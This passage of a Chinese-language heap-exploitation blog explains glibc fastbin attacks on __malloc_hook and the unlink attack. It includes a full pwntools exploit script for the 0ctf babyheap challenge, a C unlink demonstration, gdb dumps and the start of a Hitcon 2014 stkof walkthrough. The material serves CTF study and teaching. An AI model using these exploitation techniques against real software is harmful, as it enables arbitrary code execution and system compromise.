<h4 id="修改-malloc-hook指针"><a href="#修改-malloc-hook指针" class="headerlink" title="修改__malloc_hook指针"></a>修改__malloc_hook指针</h4><p>__malloc_hook在内存中的偏移为mian_arena - 0x10 ，64位情况下。 我们使用fastbin attack实现对这个地址的控制。</p>
<h4 id="fastbin-attack原理"><a href="#fastbin-attack原理" class="headerlink" title="fastbin attack原理"></a>fastbin attack原理</h4><ol>
<li>同一个fastbin 链表上有2个空闲的chunk，</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x555555757140, size=0x30, flags=PREV_INUSE)  ←  Chunk</span><br><span class="line">(addr=0x7ffff7fc2b20, size=0x0, flags=) [incorrect fastbin_index]</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
<p>我们虽然能够修改fd指针，让他指向一个虚假的chunk，但是由于fast bin内部还是有一个size的检查，会去看这个假chunk的size字段是否就是符合0x30，如果不符合就会报错。所以要想办法让这个size符合我们的fastbin的要求。我们仔细观察malloc_chunk临近内存的值情况<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b10</span><br><span class="line">0x7ffff7fc2b10 &lt;__malloc_hook&gt;: 0x0000000000000000</span><br><span class="line"></span><br><span class="line">gef➤  x/gx 0x7ffff7fc2b10 -8</span><br><span class="line">0x7ffff7fc2b08 &lt;__realloc_hook&gt;:        0x00007ffff7c83a00</span><br></pre></td></tr></table></figure></p>
<p>我们通过将这个假的chunk的size指向一个0x7ffff7fc2b08 +5这个地址，这个地方存放值是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b08 +5</span><br><span class="line">0x7ffff7fc2b0d &lt;__realloc_hook+5&gt;:      0x000000000000007f</span><br></pre></td></tr></table></figure></p>
<p>这个值是可以通过长度检测的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">           &#123;</span><br><span class="line">             errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">           errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">             return NULL;</span><br><span class="line">           ...</span><br></pre></td></tr></table></figure></p>
<p>fastbin_index(0x7f)的返回值为5，因此我们只需要在fastbin chunk index为5的链表上面构建就行了，5所对应的fast bin chunk的大小为0x70.</p>
<p>那么这个假chunk的地址就是0x7ffff7fc2b08 + 5 - 8 = 0x7ffff7fc2b05</p>
<p>通过连续malloc(0x60)两次，然后释放第二个malloc的chunk，得到下面的内存布局<br><img src="/images/heap_exp/2021-05-28-16-00-59.png" alt></p>
<p>我们通过溢出ck0，覆盖ck1的fd指针，</p>
<p>0x7ffff7fc2af5 - 8 =  0x7ffff7fc2aed<br>0x7ffff7fc2af5: 0x000000000000007f<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x555555757180, size=0x70, flags=)  ←  Chunk(addr=0x7ffff7fc2afd, </span><br><span class="line">size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  [Corrupted chunk at 0xfff7c83e20000010]</span><br></pre></td></tr></table></figure></p>
<p>现在我们把假的chunk添加到了fast bin上了，并且我们把size修正好了，使他能够绕过检测。<br>我们现在连续malloc(0x60)两次就可以得到一个指向 0x7ffff7fc2aed+16 = 0x7ffff7fc2afd的指针，通过0x7ffff7fc2afd覆盖0x7ffff7fc2b10(__malloc_hook).</p>
<p>我们覆盖的值可以为system函数的地址，通过main_arena泄露的地址，先确定system函数地址为<code>0x7ffff7c43390</code></p>
<p>观察内存值可以发现, 我们已经成功修改了_malloc_hook的值<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx &amp;__malloc_hook</span><br><span class="line">0x7ffff7fc2b10 &lt;__malloc_hook&gt;: 0x00007ffff7c43390</span><br></pre></td></tr></table></figure></p>
<p>我们再确定/bin/sh字符串的地址，进而在调用malloc的时候，直接将这个参数传进去就行了<br>确定/bin/sh的地址为<code>0x7ffff7d8ad57</code><br>但是后来发现这个二进制对长度是有限制的，只截取8个字符，所以我们不能用这种办法。</p>
<p>那就只能在二进制中直接找execve(‘/bin/sh’)的地方了，然后把这个地址写到我们的__malloc_hook中就行了</p>
<p>我的exp<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target = process(&quot;./babyheap_long&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;babyheap_long&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">recv_str = target.recv()</span><br><span class="line">print recv_str</span><br><span class="line"></span><br><span class="line"># I/O Functions</span><br><span class="line">def allocate(size):</span><br><span class="line">  target.sendline(&quot;1&quot;)</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def write_data(index, size, data):</span><br><span class="line">  target.sendline(&quot;2&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  target.send(data)</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">  target.sendline(&quot;3&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">  target.sendline(&quot;4&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  #print &quot;pillar&quot;</span><br><span class="line">  leak = target.recv()</span><br><span class="line">  return leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0xf0)</span><br><span class="line">allocate(0x70)</span><br><span class="line">allocate(0xf0)</span><br><span class="line">allocate(0x30)</span><br><span class="line"></span><br><span class="line">remove(0)</span><br><span class="line">remove(1)</span><br><span class="line"></span><br><span class="line">allocate(0x70)</span><br><span class="line"></span><br><span class="line">write_data(0,0x80,&apos;A&apos;*0x70 + p64(0x180) + p64(0x100))</span><br><span class="line"></span><br><span class="line">remove(2)</span><br><span class="line"></span><br><span class="line">allocate(0xf0)</span><br><span class="line"></span><br><span class="line">u = make_unpacker(64, endian=&apos;little&apos;, sign=&apos;unsigned&apos;)</span><br><span class="line">res = view(0)</span><br><span class="line">leak_address = res.split(&apos;\n&apos;)[1][0:8]</span><br><span class="line">print(hex(u(leak_address)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)  </span><br><span class="line"></span><br><span class="line">remove(4)   ## make heap layout</span><br><span class="line"></span><br><span class="line">write_data(2,0x78,&apos;A&apos;*0x68 + p64(0x70) + p64(0x7ffff7fc2aed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)  ## get the ptr to control malloc_hook</span><br><span class="line"></span><br><span class="line">system_addr = 0x7ffff7c43390</span><br><span class="line">write_data(5,19 + 8,&apos;A&apos;*19 + p64(system_addr))</span><br><span class="line"></span><br><span class="line">allocate(0x7ffff7d8ad57) # trigger system</span><br></pre></td></tr></table></figure></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html" target="_blank" rel="noopener">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a> </li>
<li><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li>
<li><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/" target="_blank" rel="noopener">https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/</a></li>
<li><a href="https://blog.csdn.net/qq_29343201/article/details/66476135" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/66476135</a></li>
</ol>
<h2 id="我的原图"><a href="#我的原图" class="headerlink" title="我的原图"></a>我的原图</h2><p><img src="/images/heap_exp/2021-05-28-17-30-46.png" alt></p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列三：Unlink</title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/</url>
    <content><![CDATA[<h2 id="unlink实例"><a href="#unlink实例" class="headerlink" title="unlink实例"></a>unlink实例</h2><p>通过这个实例先看看unlink攻击到底是什么样，注意这个例子是在2.26版本之前，需要不启用tcache，大家可以使用patchelf修改动态链接库指向2.23版本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">uint64_t *target;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    puts(&quot;So let&apos;s explain what a heap Unlink attack is.&quot;);</span><br><span class="line">    puts(&quot;This will give us a write, however there are several restrictions on what we write and where.&quot;);</span><br><span class="line">    puts(&quot;Also this attack is only really feasible on pre-tcache libc versions (before 2.26).\n&quot;);</span><br><span class="line"></span><br><span class="line">    puts(&quot;For this attack to work, we need to know the address of a pointer to a heap pointer&quot;);</span><br><span class="line">    puts(&quot;Think of something like a global variable (like in the bss) array which stores heap pointers.&quot;);</span><br><span class="line">    puts(&quot;This attack will write a pointer to a little bit before the array (or the entry of the array that points to the heap chunk) to itself.&quot;);</span><br><span class="line">    puts(&quot;This can be pretty useful for a variety of reasons, especially if we write the pointer to an array of pointers that we can edit. Then we can leverage the pointer from the unlink to overwrite pointers in the array.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So we start off the attack by allocating two chunks, and storing the first chunk in the global variable pointer target\n&quot;);</span><br><span class="line">    printf(&quot;The goal of this will be to overwrite the pointer to target with an address right before it.\n\n&quot;);</span><br><span class="line">    uint64_t *ptr0, *ptr1, *temp;</span><br><span class="line"></span><br><span class="line">    ptr0 = (uint64_t *)malloc(0xa0);</span><br><span class="line">    ptr1 = (uint64_t *)malloc(0xa0);</span><br><span class="line"></span><br><span class="line">    target = ptr0;      </span><br><span class="line"></span><br><span class="line">    printf(&quot;The two chunk addresses are %p and %p\n&quot;, ptr0, ptr1);   //---------------&gt; b1 </span><br><span class="line">    printf(&quot;Target pointer stores the first chunk %p at %p\n\n&quot;, target, &amp;target);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So what an unlink does, is it takes a chunk out of a doubly linked list (which certain freed chunks in the heap are stored in).\n&quot;);</span><br><span class="line">    printf(&quot;It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.\n&quot;);</span><br><span class="line">    printf(&quot;That is where we get our pointer write from. However in order to set this up, we will need to make a fake chunk that will pass three checks.\n&quot;);</span><br><span class="line">    printf(&quot;So let&apos;s start setting up the fake chunk. \n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have pointers back to our fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;This is why we need the heap chunk our fake chunk is stored in to be stored in a pointer somewhere that we know the address of.\n&quot;);</span><br><span class="line">    printf(&quot;So the previous chunks forward pointer (these chunks are stored in a doubly linked list), and the next chunks back pointer both have to point to this chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The forward pointer of this type of heap chunk is at offset 0x10, and the back pointer is at offset 0x18.\n&quot;);</span><br><span class="line">    printf(&quot;As a result for the previous pointer we can just subtract 0x10 from the address of the target, and for the forward pointer we will just subtract 0x18 from the address of target.\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[2] = (uint64_t)(&amp;target - 0x3);    // Fake Chunk P-&gt;fd pointer</span><br><span class="line">    target[3] = (uint64_t)(&amp;target - 0x2);    // Fake Chunk  P-&gt;bk pointer</span><br><span class="line"></span><br><span class="line">    printf(&quot;Fd pointer: %p\n&quot;, (void *)ptr0[2]);  //---------------------------&gt; b2</span><br><span class="line">    printf(&quot;Bk  pointer: %p\n\n&quot;, (void *)ptr0[3]);</span><br><span class="line"></span><br><span class="line">    temp = (uint64_t *)ptr0[2];</span><br><span class="line">    printf(&quot;Fake chunk starts at \t%p\n&quot;, (void *)ptr0);</span><br><span class="line">    printf(&quot;Fd-&gt;bk:    \t\t%p\n&quot;, (void *)temp[3]);</span><br><span class="line">    temp = (uint64_t *)ptr0[3];</span><br><span class="line">    printf(&quot;Bk-&gt;Fd:    \t\t%p\n\n&quot;, (void *)temp[2]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we will pass that check. Next we have to worry about the size check.\n&quot;);</span><br><span class="line">    printf(&quot;How we will trigger a heap unlink is we will edit the heap metadata of the second chunk, so that it will say that the previous chunk has been freed and it points to our fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;Then when we free the second chunk, it will cause our fake chunk to be unlinked and execute the pointer write.\n&quot;);</span><br><span class="line">    printf(&quot;However it will check that the size of our chunk is equal to the previous size of the chunk being freed, so we have to make sure that they are equal.\n&quot;);</span><br><span class="line">    printf(&quot;The previous size of the second chunk should be shrunk down so it thinks the heap metadata starts with our fake chunk. This typically means shrinking it by 0x10.\n&quot;);</span><br><span class="line">    printf(&quot;In addition to that, we have to clear the previous in use bit from the size value of the second chunk, so it thinks that the previous chunk has been freed(this can be done with something like a heap overflow).\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[0] = 0x0;    // Fake Chunk  Previous Size</span><br><span class="line">    target[1] = 0xa0;    // Fake Chunk  Size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr1[-2] = 0xa0;    // Second Chunk previous size  </span><br><span class="line">    ptr1[-1] = 0xb0;    // Secon Chunk size (can be done with a bug like a heap overflow)</span><br><span class="line"></span><br><span class="line">    printf(&quot;The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.\n&quot;);</span><br><span class="line">    printf(&quot;We will set it equal to 0x0 to avoid those unneeded checks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[4] = 0x0;    // fd_nextsize</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we have our fake chunk setup. Checkout the other writeups in this module for more details on the particular data structure of this heap chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Fake Chunk Previous Size:\t0x%x\n&quot;, (int)ptr0[0]);</span><br><span class="line">    printf(&quot;Fake Chunk Size:\t\t0x%x\n&quot;, (int)ptr0[1]);</span><br><span class="line">    printf(&quot;Fake Chunk Fd pointer:\t\t0x%x\n&quot;, (int)ptr0[2]);</span><br><span class="line">    printf(&quot;Fake Chunk Bk pointer:\t\t0x%x\n&quot;, (int)ptr0[3]);</span><br><span class="line">    printf(&quot;Fake Chunk fd_nextsize:\t\t0x%x\n\n&quot;, (int)ptr0[4]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we can free the second chunk and trigger the unlink.\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr1); // ----------------------------------&gt; b3</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that target should be the address of the Fd pointer: %p\n&quot;, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/heap_exp/2021-05-23-15-18-54.png" alt><br>红色箭头为在free(ptr1)之后target的指向</p>
<p>在b1处打断点，观察target的地址和储存值<br><img src="/images/heap_exp/2021-05-22-15-32-49.png" alt><br>target所在地址为bss全局变量区上的，存储的是ptr0指向的chunk1的地址0x5578420,与我们通过heap chunks观察到的地址相同。</p>
<p>在b2处打断点，观察内存情况<br><img src="/images/heap_exp/2021-05-22-15-47-54.png" alt></p>
<p>我们可以看到在target指向的heap chunk1-&gt;data中的偏移16个字节和偏移24个字节的地方被赋值，内容为bss段上&amp;target地址减去24和减去16。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  (long *)&amp;target -3</span><br><span class="line">0x555555756000              // &amp;target -3的地址</span><br><span class="line">gef➤  (long *)&amp;target -2</span><br><span class="line">0x555555756008              // &amp;target -2的地址</span><br></pre></td></tr></table></figure></p>
<p>在b3处打断点观察free之前的内存情况<br>这个是Chunk1的内存情况<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/10gx 0x555555758420 - 16</span><br><span class="line">0x555555758410: 0x0000000000000000      0x00000000000000b1    // prev size | current size</span><br><span class="line">0x555555758420: 0x0000000000000000      0x00000000000000a0    // </span><br><span class="line">0x555555758430: 0x0000555555756000      0x0000555555756008    // &amp;target-3| &amp;target-2</span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>下面是chunk2的内存情况<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/10gx 0x5555557584d0 - 16</span><br><span class="line">0x5555557584c0: 0x00000000000000a0      0x00000000000000b0     // current的prev_inuse标志位被置0</span><br><span class="line">0x5555557584d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557584e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557584f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758500: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>free(ptr1)的操作会带来的影响，由于chunk2的prev_inuse标志位被置0，free函数会调用进行后向融合，free的源码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">/* consolidate backward */</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = p-&gt;prev_size;                       // prev_size 为0xa0</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((long) prevsize));   // 这个指向的是0x5555557584c0 - 0xa0 = 0x555555758420 就是target[0]的内存地址</span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以unlink的参数p就是target[0]的地址0x555555758420<br>为了知道unlink函数到底是如何操作了内存，我们继续看一下unlink的源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line">    else &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span><br><span class="line">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">			       P, AV);					      \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;				      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                else &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; else &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>AV指向的是代表堆的数据结构malloc_state，P就是我们的target[0]地址，我们是在这个地方创建了一个假的chunk实际上。<br>进来之后首先会进行一个检查，<code>FD-&gt;bk != P || BK-&gt;fd != P</code> 看看FD的bk指针是不是指向的就是P，BK的fd指针是否指向P，为什么要有这个检查？<br>做这个检查主要是为了防止老版本的unlink导致的漏洞，正常的空闲链表是这样的<br><img src="/images/heap_exp/2021-05-22-16-30-24.png" alt><br>老版本的漏洞是，如果a2的fd和bk的值都已经被恶意修改了，比如利用一个堆溢出的漏洞修改了fd和bk，那么利用unlink就可以进行<br><code>a2-&gt;bk-&gt;fd = a2-&gt;fd</code>,由于a2-&gt;bk和a2-&gt;fd都可以被攻击者控制，那么攻击者就可以实现在任何一个内存地址上写任何一个自己想要的值，配合修改got表中的内容就可以实现任意代码执行的效果。</p>
<p>通过添加这个检查可以避免这种漏洞, 在unlink之前先检查a2-&gt;bk-&gt;fd是不是就是指向的a2, 就可以避免这种漏洞。</p>
<p>但是这种检查还是可以被绕过的，比如我们的这个例子就是通过创造一个虚假的chunk实现绕过这个unlink的检查。<br>现在a2就是target[0]的地址<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555555758420: 0x0000000000000000      0x00000000000000a0    // </span><br><span class="line">0x555555758430: 0x0000555555756000      0x0000555555756008    // &amp;target - 3  | &amp;target - 2 </span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>FD的值为0x0000555555756000<br>BK的值为0x0000555555756008<br>FD-&gt;bk值为0x0000555555756000的内存偏移24的位置存储的值,我们知道0x0000555555756000这个值是&amp;target - 0x3， 它偏移24就是target的地址&amp;target，他存储的值就是target, 而BK-&gt;fd为0x0000555555756008偏移16的位置存储的值，我们知道0x0000555555756008这个值是&amp;target - 0x3，它偏移16也是&amp;target，那么它存储的值也是target，而P就是target，所以就绕过了这个<code>FD-&gt;bk != P || BK-&gt;fd != P</code>的检查。<br>而<code>FD-&gt;bk = BK</code>这个操作就是让存储target的内存设置为0x0000555555756008<br>而<code>BK-&gt;fd = FD;</code>这个操作是让存储target的内存设置为0x0000555555756000  （ (uint64_t)(&amp;target - 0x3); ）<br>所以我们检查一下target的值最后是不是<code>0x0000555555756000</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/g &amp;target</span><br><span class="line">0x555555756018 &lt;target&gt;:        0x0000555555756000</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到结果如我们的预测。<br>这个到底有什么用呢？<br>假如我们现在有一个数组是这样的<br><img src="/images/heap_exp/2021-05-22-20-24-21.png" alt></p>
<p>当我们通过这种unlink的攻击，可以让target的值为array的开头，就是&amp;target -3，由于target本来是一个指向heap的指针，那么如果程序后面对heap的内存修改实际上是对这个数组的修改，如果这个内容可控的话，我们就可以修改会被调用的函数指针和是否通过认证的标志位，进而实现绕过认证或者任意代码执行的效果。或者是存在一个指针，这个指针在正常的业务中会被写入用户可控的内容，那么就构成了write what where的模式，可以实现往任意地方写任意内容的原型。</p>
<h2 id="Hitcon-2014-stkof"><a href="#Hitcon-2014-stkof" class="headerlink" title="Hitcon 2014 stkof"></a>Hitcon 2014 stkof</h2><p>我们使用Hitcon 2014一道赛题来看看这种unlink的实战。<br>题目文件的<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof" target="_blank" rel="noopener">下载链接</a>  </p>
<ul>
<li><p>目标：我们的目标是通过标准输入完成任意代码执行。</p>
</li>
<li><p>调试环境搭建：使用patchelf失败，显示的是segment fault，现在还不清楚为什么，由于这个文件是一个可执行文件而不是共享目标文件，貌似patchelf在给可执行文件做patch的时候是有点问题。看到有一篇博文<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/06/01/note/" target="_blank" rel="noopener">RCTF 2020 Pwn note</a> 介绍了不用patch直接通过修改环境变量以及直接运行ld文件，把二进制文件当做参数传给ld文件的方法是可以成功的。受次启发，使用gdb的时候直接调试ld文件，然后在gdb设置环境变量和参数，但是同样报segment fault。无奈只能求助于gdbserver attach，由于我们是可以在命令中直接运行的，最终终于搭建调试环境，至于为什么其他方法不行，我有机会再研究，也欢迎知道原理的同学交流一下。</p>
<ul>
<li><p>由于后面还要往标准输入写入特殊符号，所以还是要借助python实现调试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">target = process(&quot;./stkof&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_1&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;stkof&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_1&quot;)</span><br></pre></td></tr></table></figure>
<p>这些代码可以实现利用python起这个二进制文件，然后通过target.sendline发送任意的字符</p>
</li>
</ul>
</li>
<li><p>信息收集：看一下文件格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pws@pws:~/Desktop/workplace/heap_challenge/unlink$ file strof </span><br><span class="line">strof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, </span><br><span class="line">interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>尝试运行一下libc.so.6,发现是2.23版本的glibc<br><img src="/images/heap_exp/2021-05-22-20-35-44.png" alt><br>checksec可以看到开启了nx和栈cookie，<br><img src="/images/heap_exp/2021-05-22-20-35-16.png" alt><br>考虑堆溢出漏洞<br>利用ida分析二进制，先看一眼使用的库函数<br><img src="/images/heap_exp/2021-05-22-20-28-31.png" alt><br>有malloc，所以重点关注对堆内存的操作</p>
<ul>
<li><p>找到漏洞</p>
<ul>
<li><p>我们可以简单推断出这是一个堆溢出的漏洞，我们看下malloc的逻辑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 sub_400936()</span><br><span class="line">&#123;</span><br><span class="line">__int64 size; // [rsp+0h] [rbp-80h]</span><br><span class="line">char *v2; // [rsp+8h] [rbp-78h]</span><br><span class="line">char s[104]; // [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">unsigned __int64 v4; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">v4 = __readfsqword(0x28u);</span><br><span class="line">fgets(s, 16, stdin);</span><br><span class="line">size = atoll(s);</span><br><span class="line">v2 = (char *)malloc(size);</span><br><span class="line">if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">(&amp;global_var)[++dword_602100] = v2;</span><br><span class="line">printf(&quot;%d\n&quot;, (unsigned int)dword_602100);</span><br><span class="line">return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>malloc的大小是用户可控的，再观察操作堆空间的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fgets(s, 16, stdin);</span><br><span class="line">n = atoll(s);</span><br><span class="line">ptr = (&amp;global_var)[v2];</span><br><span class="line">for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )</span><br></pre></td></tr></table></figure>
<p>同样是用户可以操控写入的长度的，所以这个的确是一个堆溢出的漏洞。</p>
</li>
</ul>
</li>
<li><p>利用思路</p>
<ul>
<li>我们可以看到这个被溢出的堆的地址被写入了global_var这个数组里面，而且我们也可以连续触发两个malloc得到连续的chunk，因此符合我们的unlink利用条件。</li>
<li><p>首先需要两次malloc，我们同样尝试malloc的参数为0xa0,根据逆向结果我们输入1就可以触发分配的逻辑</p>
<ul>
<li><p>我们通过1 0xa0 连续3次得到了两个挨着的大小为0xb0的chunk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk1 :0x0000000000e064e0      </span><br><span class="line">chunk2 :0x0000000000e06590</span><br></pre></td></tr></table></figure>
</li>
<li><p>现在我们要在chunk1中构造一个虚假的chunk，目的是骗过unlink的检查</p>
<ul>
<li>存储chunk1指针的地址为0x602150,我们要把0x602150-3*8 和 0x602150-2*8放到内存中，按照下面这个图<br><img src="/images/heap_exp/2021-05-23-15-28-37.png" alt></li>
<li>我们只需要根据程序的业务照做这件事就行了，首先得到chunk1的控制权,我们需要根据索引值得到，根据这个图<br><img src="/images/heap_exp/2021-05-23-17-23-42.png" alt><br>我们则可以看出来chunk1 相对于0x0000000000e064e0 0x602140这个数组开始地址的偏移为2，所以我们要输入2来获得对这个堆的控制权。</li>
</ul>
</li>
<li><p>现在我们要溢出chunk1，修改chunk2的的开头部分</p>
<ul>
